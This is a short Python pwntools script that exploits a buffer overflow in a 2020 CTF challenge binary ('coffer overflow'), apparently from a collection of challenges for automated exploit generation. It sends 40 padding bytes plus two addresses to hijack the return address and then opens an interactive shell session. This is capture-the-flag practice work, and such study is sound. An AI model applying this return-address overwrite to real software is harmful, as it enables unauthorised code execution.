from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/18_redpwnctf2020_coffer/redpwnctf2020_coffer")
pwn.gdb.attach(p)
p.recvuntil(b'Welcome to coffer overflow, where our coffers are overfilling with bytes ;)\nWhat do you want to fill your coffer with?\n')
payload = b"\x00" * 40
payload += p64(0x40053e) + p64(0x4006f2)
payload += b"\n"
p.send(payload)
p.interactive()
